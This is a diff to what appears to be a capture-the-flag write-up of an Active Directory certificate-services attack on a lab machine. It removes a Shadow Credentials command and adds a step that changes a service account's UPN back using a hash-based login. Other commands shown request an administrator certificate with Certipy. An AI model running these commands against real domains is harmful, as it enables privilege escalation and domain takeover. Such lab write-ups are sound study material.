@@ -33,16 +33,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 ```
 
-**Step 3: (If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials).**
 
-```shell
-certipy shadow \
-    -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -dc-ip '10.0.0.100' -account 'victim' \
-    auto
-```
 
-**step 4: request any cert with user authentication like the `user` template:**
+**step 3: request any cert with user authentication like the `user` template:**
 ```bash
 certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
 
@@ -55,6 +48,13 @@ certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-C
 [*] Saving certificate and private key to 'administrator.pfx'
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
+
+**step 4: revert the `ca_svc`'s UPN:**
+```bash
+certipy account -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+
+```
+
 
 **step 5: authenticate:**
 ```bash
